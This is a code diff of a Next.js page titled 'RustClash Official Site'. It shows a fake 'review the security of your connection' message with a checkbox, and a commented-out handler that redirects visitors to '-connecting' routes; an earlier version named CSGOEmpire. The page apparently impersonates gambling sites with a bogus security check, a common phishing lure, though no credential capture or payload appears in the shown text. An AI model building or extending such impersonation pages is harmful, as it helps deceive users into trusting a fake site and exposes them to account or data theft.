@@ -1,21 +1,22 @@
 'use client'
 import styles from "./page.module.css";
-import circel from "../../public/R-tron.png";
-import image from "../../public/image.png";
+import circel from "../../../public/R-tron.png";
+import image from "../../../public/image.png";
 import Image from "next/image";
 
 export default function Home() {
-  const handleClick = () => {
-      window.location.href = "/csgoempire-connecting"; 
-  }
+  // const handleClick = () => {
+  //     window.location.href = "/rustclash-connecting"; 
+  // }
 
   return (
     <div
+      // onMouseMove={handleClick}
       // onClick={handleClick}
     >
       <main className={styles.main}>
         <h3 className={styles.text}>
-        RustClash Official Site{" "}
+            RustClash Official Site{" "}
           <span
             style={{ transform: "translate(0px)", display: "inline-block" }}
           >
@@ -27,9 +28,7 @@ export default function Home() {
         </p>
         <p className={styles.text3}>
           We needs to review the security of your connection before proceeding
-          RustClash
         </p>
-       
         <div style={{ marginTop: 30, position: "relative" }}>
           <Image src={image} alt="Logo" className={styles.image2} />
           <input type="checkbox" className={styles.checkbox} />
